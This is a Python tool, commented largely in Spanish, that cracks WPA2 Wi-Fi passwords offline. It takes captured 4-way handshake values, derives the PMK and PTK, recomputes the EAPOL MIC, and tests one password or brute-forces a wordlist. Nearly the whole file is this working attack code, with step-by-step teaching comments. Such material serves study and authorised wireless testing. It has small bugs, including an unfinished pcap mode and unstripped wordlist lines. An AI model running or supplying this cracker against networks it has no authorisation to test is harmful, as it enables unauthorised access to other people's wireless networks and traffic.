import hmac,hashlib
import scapy
from scapy.all import *
from pbkdf2 import PBKDF2
import binascii
import os

# Definimos las secuencias ANSI para el color magenta
MAGENTA = '\033[95m'
RESET = '\033[0m'


# Function: Clear Screen
def clear_screen():
    # Detect the operating system
    if os.name == 'nt':  # For Windows
        os.system('cls')
    else:  # For Linux and Mac
        os.system('clear')

# Función para formatear los datos en bloques de 2 caracteres por byte y 16 bytes por línea
def format_hex_display(data):
    hex_string = binascii.hexlify(data).decode('utf-8')
    formatted = " ".join([hex_string[i:i+2] for i in range(0, len(hex_string), 2)])
    lines = [formatted[i:i+47] for i in range(0, len(formatted), 48)]  # 16 bytes (32 chars) per line, plus spaces
    return "\n".join(lines)

## Variables que necesita el 4-Way-Handshake:
class WPA2Handshake:
    ssid = ''
    macAP = ''
    macCli = ''
    anonce = ''
    snonce = ''
    mic = ''
    passw = ''
    Eapol2frame = ''

## Function: Ingresar Valores en shell
def testData():
    WPA2Handshake.ssid        = input("Enter the ssid in string value (e.g. Fz3r0_CWAP_SSID)        :: ") or "Facility"
    WPA2Handshake.macAP       = input("Enter the MAC Address of AP (e.g. F0:F0:F0:F0:F0:F0)         :: ") or "10:f0:68:6a:7d:3c"
    WPA2Handshake.macCli      = input("Enter the MAC Address of client STA (e.g. B2:B2:B2:B2:B2:B2) :: ") or "ee:c1:e4:4f:1f:f3"
    WPA2Handshake.anonce      = input("Enter the Anonce (e.g. EAPOL M1 HEX Nonce = Anonce)          :: ") or "36efa59edfe46fd84d111dd7d8a390d911579e8e6caa86412a528f518e08b2d1"
    WPA2Handshake.snonce      = input("Enter the Snonce (e.g. EAPOL M2 HEX Nonce = Snonce)          :: ") or "8e79a5461b1dee8a0c1e9a67addb86f1a54df4c13e91bbda2e8b383e6d773d9e"
    WPA2Handshake.mic         = input("Enter the MIC (e.g. EAPOL M2 MIC)                            :: ") or "0a5faaac4272850c8e987bb27b3fca8b"
    WPA2Handshake.Eapol2frame = input("Enter the EAPOL2 Frame in HEX (export > HEX-string)          :: ") or "0103007502010a000000000000000000018e79a5461b1dee8a0c1e9a67addb86f1a54df4c13e91bbda2e8b383e6d773d9e00000000000000000000000000000000000000000000000000000000000000000a5faaac4272850c8e987bb27b3fca8b001630140100000fac040100000fac040100000fac020000"
    
####################################################################################################################
#
# Function: Algoritmo PRF512 (Para obtener PTK)

# Explicación general:
# Esta función realiza la operación de Pseudo-Random Function (PRF) utilizando el algoritmo HMAC-SHA1 para generar una salida de longitud fija (512 bits) 
# a partir de una clave (pmk), un texto (text), y datos adicionales (key_data). 
# Este tipo de función es fundamental en el proceso de creación de la Pairwise Transient Key (PTK) en el protocolo WPA2, 
# el cual se usa para cifrar las comunicaciones entre un dispositivo y el punto de acceso Wi-Fi.

def customPRF512(pmk, text, key_data):
    # Inicializamos el contador c, que se utilizará para iterar y modificar la entrada del HMAC-SHA1
    c = 0
    
    # Definimos el tamaño del bloque de salida que queremos obtener, 64 bytes (512 bits)
    block = 64
    
    # Creamos un objeto vacío de tipo bytes donde se acumularán los resultados del HMAC
    result = bytes()
    
    # Ejecutamos el ciclo mientras c sea menor o igual al número de iteraciones necesarias para generar los 512 bits.
    # El cálculo ((block * 8 + 159) / 160) nos da cuántas veces tenemos que generar un HMAC-SHA1 para cubrir los 512 bits,
    # ya que cada iteración genera 160 bits (20 bytes). La adición de 159 asegura que se redondee hacia arriba.
    while c <= ((block * 8 + 159) / 160):
        
        # Generamos un nuevo HMAC-SHA1 en cada iteración. 
        # La clave del HMAC es la pmk (Pairwise Master Key), derivada de la contraseña Wi-Fi.
        # El mensaje para el HMAC es la concatenación de:
        # 1. `text`, que es un valor que pasamos a la función.
        # 2. `chr(0x00).encode()`, que es un separador nulo en formato bytes.
        # 3. `key_data`, que es información adicional.
        # 4. `chr(c).encode()`, que es el valor del contador `c` convertido en un byte. Esto asegura que cada bloque generado sea único.
        hmacsha1 = hmac.new(pmk, text + chr(0x00).encode() + key_data + chr(c).encode(), hashlib.sha1)
        
        # El resultado de la función hmacsha1.digest() devuelve un bloque de 20 bytes (160 bits).
        # Vamos concatenando el resultado de cada iteración al objeto result.
        result = result + hmacsha1.digest()
        
        # Incrementamos el valor de c para la siguiente iteración, permitiendo que se genere un nuevo bloque.
        c += 1
    
    # Finalmente, devolvemos los primeros `block` bytes (64 bytes, 512 bits) del resultado acumulado.
    # Aunque generemos más de 512 bits, solo los primeros 512 bits son los que nos interesan.
    return result[:block]

def loadHandshakeFromPcap(scapycap):
    #main
    count = 0
    for packet in scapycap:
        if packet.haslayer("EAPOL"):
            rw = bytes(packet["Raw"]).hex()
            if count == 0:
                WPA2Handshake.anonce = rw[26:90]
                WPA2Handshake.macCli = packet.addr1
            elif count == 1:
                WPA2Handshake.snonce = rw[26:90]
                WPA2Handshake.macAP = packet.addr3
                WPA2Handshake.mic = rw[154:186]
                WPA2Handshake.Eapol2frame = raw(packet["EAPOL"]).hex()
            count += 1
    if count == 0:
        "No handshake found!"
        exit()


def viewdata():
    #view

    print("SSID: "+ WPA2Handshake.ssid)
    print("mac_ap :"+str(WPA2Handshake.macAP))
    print("mac_Cli :"+str(WPA2Handshake.macCli))
    print("anonce: "+WPA2Handshake.anonce)
    print("snonce: "+WPA2Handshake.snonce)
    print("Captured MIC: "+WPA2Handshake.mic)
    print("")


def banner():
    clear_screen()
    print("")
    print("############################################")
    print("#  MIC Cracker WPA2 by Fzr0 perrote mayor  #")
    print("############################################")
    print("")

#main
def main():
    while True:
        banner()
        print("Select the load mode!")
        print("[0] - Manual Input")
        # print("[1] - PCAP input")  <---- falta arreglar!!!!
        print("[9] - Exit")
        opt = int(input(" > Select an option: "))
        if opt == 9:
            exit()
        elif opt == 0:
            testData()
            passmode()
        elif opt == 1:
            WPA2Handshake.ssid = input("Enter the ssid: ") or 'Coherer'
            handshake = input("PCAP path > ") 
            scapycap = rdpcap(handshake)
            loadHandshakeFromPcap(scapycap)
            passmode()

def passmode():
    print("")
    while True:
        viewdata()
        print("[0] - Manual check password")
        print("[1] - Bruteforce password")
        print("[9] - Back")
        opt = int(input(" > Select an option: "))
        print("")
        if opt == 9:
            main()
        elif opt == 1:
            crackPasswd()
        elif opt == 0:
            WPA2Handshake.passw = input("input the password to check: > ") or "Induction"
            checkPasswd()

def crackPasswd():
    wordlist = input("Wordlist path >")
    file = open(wordlist,'r+')
    for l in file.readlines():

        # PMK Derivation 
        PMK = PBKDF2(l, WPA2Handshake.ssid, 4096).read(32)







        # MAC AP: From EAPOL Mx
        macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
        macAPparsed = binascii.a2b_hex(macAPparsed)
        macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
        macCliparsed = binascii.a2b_hex(macCliparsed)
        anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
        snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)
        txt = b"Pairwise key expansion"
        PTK = customPRF512(PMK,txt,key_data)
        KCK = PTK[0:16]
        eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]
        calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
        if calculated_mic.hex() == WPA2Handshake.mic:
            print("####################")
            print("# Password Correct #")
            print("####################")
            print("PW: "+str(l))
            print("")
            
def checkPasswd():

    ## CREAR Y MOSTRAR PMK

    print()
    print("[+] Generating PMK via PBKDF2...")
    print()

    # Formula para PMK:
    PMK = PBKDF2(WPA2Handshake.passw, WPA2Handshake.ssid, 4096).read(32)

    # Imprimir PMK:
    print("Pairwise Master Key (PMK): " + str(PMK.hex()))
    print()

    ##########################################################################

  
    ## CREAR Y MOSTRAR PTK

    print()
    print("[+]Generating PTK...")
    print()

    ## Proceso para generar la PTK
    print("[-] Generating key_data...")
    print()

    ## 1. Extraer MAC de AP y quitar ":" para la operación
    macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
    macAPparsed = binascii.a2b_hex(macAPparsed)
    
    ## 2. Extraer MAC de STA y quitar ":" para la operación
    macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
    macCliparsed = binascii.a2b_hex(macCliparsed)
    
    ## 3. Extraer Anonce (AP) de M1 EAPOL
    anoncep = binascii.a2b_hex(WPA2Handshake.anonce)

    ## 4. Extraer Snonce (STA) de M1 EAPOL
    snoncep = binascii.a2b_hex(WPA2Handshake.snonce)

    ## 5. Calcular y concatenar el Key Data
    key_data = min(macAPparsed,macCliparsed) + max(macAPparsed,macCliparsed)+ min(anoncep,snoncep)+ max(anoncep,snoncep)

    # Variable "txt"
    txt = b"Pairwise key expansion"

    # Imprimir Key Data en HEx
    print("key data: "+binascii.b2a_hex(key_data).decode())
    print()


    print("[-] Running PRF512 algorithm...")
    print()

    PTK = customPRF512(PMK,txt,key_data)
    print("Pairwise Temporal Key (PTK): " + str(PTK.hex()))
    print()




    #################################################################################################
    #
  
    ## CALCULAR Y MOSTRAR MIC

    # Esta función está realizando un ataque tipo "offline handshake", 
    # en el cual se intenta calcular el MIC con una clave propuesta (derivada del PTK), 
    # y compararlo con el MIC del paquete capturado (EAPOL frame).

    # Muestra un mensaje indicando que se está empezando el cálculo del MIC. 
    print()
    print("######################")    
    print("#                    #") 
    print("#   Calculando MIC   #")
    print("#                    #") 
    print("######################") 
    print()

    
    # 1. ExtraER KCK del PTK y mostrarla:
    print("1. ExtraER KCK del PTK:") 
    print("    - Se extrae la KCK (Key Confirmation Key) de los primeros 16 bytes del PTK (Pairwise Transient Key).")
    print("    - La KCK siempre tiene una longitud de 16 bytes, que es suficiente para la generación del MIC.")
    print()
    print("[*] KCK: ")
    KCK = PTK[0:16]
    print(KCK)
    print()

    
    # 2. Poner en 0 en valor del MIC
    print("2. Poner en 0 en valor del MIC") 
    print("    - Para poder recalcular el MIC, el campo que lo contiene en el mensaje debe 'anularse' (o 'poner a cero') antes de hacer el cálculo.") 
    print("    - Si no se pusiera en 0, no se podría recalcular el MIC ya que el valor anterior interferiría.")  
    print("    - De esta manera, el cálculo solo se basará en los otros datos del frame, junto con la Passphrase que estás probando.") 
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
        # - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
        # - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
        # - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
        #     ** Esto crea una copia del frame EAPOL donde el campo MIC está lleno de ceros, lo que te permite recalcularlo desde cero correctamente.
    eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]

    # * Muestra el frame EAPOL antes de ser modificado, lo cual es útil para verificar que estamos trabajando con el frame correcto. 
    #   Esto es para fines de depuración

    # * Muestra el frame EAPOL antes de ser modificado, resaltando el MIC en magenta
    print("[-] EAPOL M2 (Message 2) :: Antes de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos el valor original del MIC en magenta
    print(f"{MAGENTA}{WPA2Handshake.Eapol2frame[162:194]}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
    #   - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
    #   - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
    #   - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
    eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]

    # * Muestra el frame EAPOL después de ser modificado, resaltando los ceros en magenta
    print("[-] EAPOL M2 (Message 2) :: Después de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos los 32 ceros reemplazados en color magenta
    print(f"{MAGENTA}{'0' * 32}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # 3. Calcular el MIC
    # - Muestra que ahora se va a proceder con el cálculo del MIC.
    print("    [2] Calculando MIC desde 0 utilizando HMAC y KCK como clave para el algoritmo HMAC:")
    print("")
    
    # * Formula para calcular MIC
    # - Descripción:                  Aquí se está calculando el MIC utilizando HMAC (Hash-based Message Authentication Code) .
    #                                 MIC = {hmac (KCK, EAPOL 2 Frame con MIC en 0, hashlib.sha1)}
    # -                               Se utiliza la KCK como clave para el algoritmo HMAC.
    # - binascii.a2b_hex(eapol2data): Convierte la versión hexadecimal del eapol2data en formato binario, que es lo que espera el algoritmo HMAC.
    # - hashlib.sha1:                 Se utiliza SHA-1 como función hash para generar el HMAC.
    # - .digest()[:16]:               El resultado de digest() genera un hash de 20 bytes (SHA-1), pero solo se toman los primeros 16 bytes porque es el tamaño requerido para el MIC.
    calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]

    # 5. Calcular el MIC
    print("        [*] MIC Calculada :  "+str(calculated_mic.hex()))
    print("        [*] MIC capturada :  "+str(WPA2Handshake.mic))
    print("")


    # 6. Comparar ambos MIC, si coinciden será password correcto
    if calculated_mic.hex() == WPA2Handshake.mic:
        print("")
        print("####################")
        print("# Password Correct #")
        print("####################")
        print("")

    else: 
        print("")
        print("######################")
        print("# Password Incorrect #")
        print("######################")
        print("") 
        
    

main()
